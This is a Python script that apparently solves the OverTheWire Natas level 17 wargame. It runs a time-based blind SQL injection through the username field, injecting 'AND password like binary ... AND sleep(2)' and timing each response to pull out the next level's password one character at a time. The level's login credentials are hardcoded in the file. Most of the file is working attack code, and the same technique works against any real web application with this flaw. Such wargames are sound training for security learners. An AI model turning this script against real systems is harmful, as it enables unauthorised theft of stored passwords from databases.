import natas, requests

URL = 'http://natas17.natas.labs.overthewire.org/index.php'
USER = 'natas17'
PASS = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
header = {"Content-Type": "application/x-www-form-urlencoded"}
proxy = {"http":"http://127.0.0.1:8080"}

alfabeto = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

passwd = ''
counter = 0
for req in range(32):
    for c in alfabeto:
        payload = f"username=natas18\"+AND+password+like+binary+'{passwd+c}%25'+AND+sleep(2)%23--+-"
        # payload = f"username=natas18\"+AND+sleep(3)%23--+-"
        post = requests.post(url=URL, auth=auth_basic, headers=header, data=payload)
        counter = counter+1
        time = round(post.elapsed.total_seconds())
        if time == 2:
            passwd += c
            print(f'pass is {passwd}')
            break